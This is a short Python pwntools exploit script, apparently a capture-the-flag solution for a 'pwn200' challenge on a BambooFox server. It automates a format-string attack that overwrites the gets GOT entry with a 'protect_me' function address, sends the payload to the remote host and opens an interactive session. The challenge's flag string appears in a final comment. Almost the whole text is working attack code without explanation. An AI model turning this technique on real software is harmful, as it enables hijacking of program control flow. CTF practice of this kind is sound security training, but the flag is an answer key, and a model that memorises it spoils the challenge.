from pwn import *


addr_gets = 0x804a010
addr_protect_me = 0x804854d

def exec_fmt(payload):
	# p = remote("bamboofox.cs.nctu.edu.tw", 22002)
	p = process("./pwn200")
	p.sendline(payload)	
	return p.recv(4096)

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
# offset = 5

payload = fmtstr_payload(offset, {addr_gets: addr_protect_me})
r = remote("bamboofox.cs.nctu.edu.tw", 22002)
r.sendline(payload)
r.interactive()

# BAMBOOFOX{YOU_PASS_THE_CANARY_WITH_FORMAT_STRING_OR_NOT}
